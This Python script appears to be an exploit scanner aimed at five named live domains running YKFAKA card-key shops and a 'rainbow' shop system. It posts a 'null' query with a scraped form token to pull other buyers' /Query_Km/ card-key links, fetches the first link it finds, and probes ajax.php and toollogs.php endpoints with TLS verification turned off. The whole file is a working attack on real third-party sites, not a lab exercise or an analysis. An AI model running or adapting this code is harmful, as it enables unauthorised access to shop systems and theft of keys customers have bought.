#!/usr/bin/env python3
"""Probe YKFAKA null chain + rainbow shop on multiple sites."""
import json
import re
import sys
import time

import requests

requests.packages.urllib3.disable_warnings()

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120"
SITES = [
    ("mima1314.com", "https://mima1314.com"),
    ("xmqqw.vip", "https://xmqqw.vip"),
    ("bwqq.top", "https://bwqq.top"),
    ("tjqq.top", "https://tjqq.top"),
    ("gao1314.com", "https://gao1314.com"),
]
TOKEN_RE = re.compile(
    r'name=["\']__token__["\'][^>]*value=["\']([^"\']+)["\']'
    r'|value=["\']([^"\']+)["\'][^>]*name=["\']__token__["\']'
)
KM_RE = re.compile(r"/Query_Km/([a-f0-9]{12})")
CSRF_RE = re.compile(r'csrf_token\s*=\s*"([^"]+)"')


def probe(name, base):
    r = {"site": name, "base": base, "ts": time.strftime("%Y-%m-%d %H:%M:%S")}
    s = requests.Session()
    s.headers.update({"User-Agent": UA})
    s.verify = False
    try:
        home = s.get(base, timeout=20)
        r["home_status"] = home.status_code
        r["ykfaka"] = "YKFAKA" in home.text
        q = s.get(base + "/Query.html", timeout=20)
        r["query_status"] = q.status_code
        r["query_len"] = len(q.text)
        tok = TOKEN_RE.search(q.text)
        r["token"] = (tok.group(1) or tok.group(2)) if tok else None
        if tok:
            token = tok.group(1) or tok.group(2)
            p = s.post(
                base + "/Query.html",
                data={"value": "null", "page": "1", "__token__": token},
                headers={"Referer": base + "/Query.html"},
                timeout=20,
            )
            r["null_status"] = p.status_code
            r["null_snip"] = p.text[:300].replace("\n", " ")
            r["null_blocked"] = "非法" in p.text
            kms = KM_RE.findall(p.text)
            r["km_links"] = len(kms)
            r["km_sample"] = kms[:5]
            if kms:
                kmr = s.get(
                    base + "/Query_Km/" + kms[0],
                    headers={"Referer": base + "/Query.html"},
                    timeout=15,
                )
                r["km_fetch_status"] = kmr.status_code
                r["km_fetch_snip"] = kmr.text[:200].replace("\n", " ")
        sh = s.get(base + "/shop/", timeout=15)
        r["shop_status"] = sh.status_code
        r["shop_len"] = len(sh.text)
        r["rainbow"] = "ajax.php" in sh.text
        if sh.status_code == 200 and len(sh.text) > 1000:
            gc = s.get(base + "/shop/ajax.php?act=getcount", timeout=12)
            r["getcount"] = gc.text[:200]
            csrf = CSRF_RE.search(sh.text)
            if csrf:
                r["csrf"] = csrf.group(1)
            tl = s.get(base + "/shop/toollogs.php", timeout=12)
            r["toollogs_status"] = tl.status_code
            r["toollogs_snip"] = tl.text[:150]
    except Exception as e:
        r["error"] = str(e)
    return r


def main():
    out = []
    for name, base in SITES:
        res = probe(name, base)
        out.append(res)
        print(json.dumps(res, ensure_ascii=False))
    path = sys.argv[1] if len(sys.argv) > 1 else "/tmp/ykfaka_deep_probe.json"
    with open(path, "w") as f:
        json.dump(out, f, ensure_ascii=False, indent=2)
    print("saved", path)


if __name__ == "__main__":
    main()
